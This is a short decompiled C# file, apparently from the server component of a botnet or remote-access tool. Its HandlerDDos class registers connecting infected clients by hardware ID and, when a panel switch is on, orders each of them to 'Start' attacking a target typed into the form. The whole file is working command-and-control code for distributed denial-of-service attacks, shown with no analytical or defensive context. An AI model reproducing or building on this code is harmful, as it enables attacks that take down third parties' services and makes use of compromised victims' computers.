using System;
using System.Windows.Forms;
using Server.Connectings;
using Server.Connectings.Events;

namespace Server.Messages
{
	// Token: 0x02000040 RID: 64
	internal class HandlerDDos
	{
		// Token: 0x060001B1 RID: 433 RVA: 0x0001BC88 File Offset: 0x00019E88
		public static void Read(Clients clients, object[] array)
		{
			if ((string)array[1] == "Connect")
			{
				if (Program.form.DDos.work)
				{
					clients.Hwid = (string)array[2];
					clients.eventDisconnect += (s, b) =>
					{
						Control ddos = Program.form.DDos;
						ddos.Invoke((MethodInvoker)(() =>
						{
							Program.form.DDos.clients.Remove(clients);
						}));
					};
					Program.form.DDos.Invoke(new MethodInvoker(delegate()
					{
						Program.form.DDos.clients.Add(clients);
					}));
					if (Program.form.DDos.materialSwitch7.Checked)
					{
						clients.Send(new object[]
						{
							"Start",
							Program.form.DDos.rjTextBox1.Texts
						});
						return;
					}
				}
				else
				{
					clients.Disconnect();
				}
			}
		}
	}
}
